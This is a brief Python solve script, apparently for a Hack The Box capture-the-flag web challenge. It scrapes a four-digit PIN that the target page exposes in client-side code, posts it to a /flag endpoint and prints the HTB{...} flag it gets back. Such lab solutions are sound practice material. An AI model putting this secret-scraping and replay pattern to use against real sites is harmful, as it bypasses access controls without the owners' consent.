import requests
import sys
import re

headers = { "Content-Type": "application/json" }

url = sys.argv[1]
url1 = f"http://{url}/flag"
code_url = f"http://{url}/"
code = requests.get(code_url)

html = code.text
final_code = re.search(r'correctPin:\s*["\'](\d{4})["\']', html).group(1)

data = {
    "pin": final_code
}

r = requests.post(url1, json=data, headers=headers)

flag = re.search(r"HTB\{.*?\}", r.text)
if flag:
    print(flag.group(0))
